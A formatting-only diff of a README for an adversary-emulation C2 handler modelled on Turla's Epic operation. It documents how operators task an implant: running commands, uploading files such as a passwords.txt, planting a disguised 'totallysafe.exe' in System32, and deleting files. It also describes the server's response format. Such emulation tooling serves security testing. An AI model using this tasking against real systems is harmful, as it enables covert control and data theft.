@@ -12,6 +12,7 @@ the `config/handler_config.yml` from the main C2 server repo. Adjust the `epic`
 entry as needed.
 
 HTTP example:
+
 ```yaml
 epic:
     host: 10.0.2.8
@@ -21,6 +22,7 @@ epic:
 ```
 
 HTTPS example:
+
 ```yaml
 epic:
     host: 10.0.2.8
@@ -41,32 +43,41 @@ To submit a task for the C2 server, use the following command format:
 ```bash
 ./evalsC2client.py --set-task [UUID] 'key | value | [optional args]'
 ```
+
 The `key | value` pair is converted into `key = value` format and placed into
 the configuration file portion of the server's response.
 
 The optional args are used for specific commands, as detailed below.
 
 The keys tell the implant what to do:
+
 - `exe` - tells the implant to execute the command contained in the value
+
   ```
   ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | whoami'
   ```
+
 - `result` - tells the implant to upload the file that is located at the value
+
   ```
   ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'result | C:\users\bob\passwords.txt'
   ```
+
 - `name` - tells the implant receive a file that the handler is sending to it, with
   the value being the path that the file contents should be written to on the implant
   and an option arg telling the handler the file that it should send
+
   ```
   ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'name | C:\Windows\System32\totallysafe.exe | hello_world.elf'
   ```
+
 - `del_task` - tells the implant to delete the file that is located at the value
+
   ```
   ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'del_task | C:\Users\bob\passwords.txt'
   ```
 
-Note: The template for the EPIC C2 handler HTML response has been taken from here: https://securelist.com/the-epic-turla-operation/65545/
+Note: The template for the EPIC C2 handler HTML response has been taken from here: <https://securelist.com/the-epic-turla-operation/65545/>
 
 ## Components
 
@@ -85,6 +96,7 @@ address/port and serves the following URL endpoints:
   ```json
   {"UUID":"<UUID>", "type":"<command type>", "data":"<data>"}
   ```
+
   - The `UUID` field is empty if this is the first time the implant makes
     contact with the server; otherwise, it contains the UUID assigned to it by
     the server. To allow for reproducibility, the server has two hard coded
@@ -108,11 +120,12 @@ address/port and serves the following URL endpoints:
     the previous communication cycle.
 
   The server will respond in the following binary format:
+
   ```
   |-----------------------------------------------------------|
   |      Command Id (unsigned int, 4 bytes, little endian)    |
   |-----------------------------------------------------------|
-  |     Payload Size (unsigned int, 4 bytes, little endian)   | 
+  |     Payload Size (unsigned int, 4 bytes, little endian)   |
   |-----------------------------------------------------------|
   |                         Payload                           |
   |-----------------------------------------------------------|
@@ -121,6 +134,7 @@ address/port and serves the following URL endpoints:
   |                    Configuration File                     |
   |-----------------------------------------------------------|
   ```
+
   - The command ID starts at 0 and increments for each command sent to the
     implant.
   - The payload is any executable that the implant should execute. It is
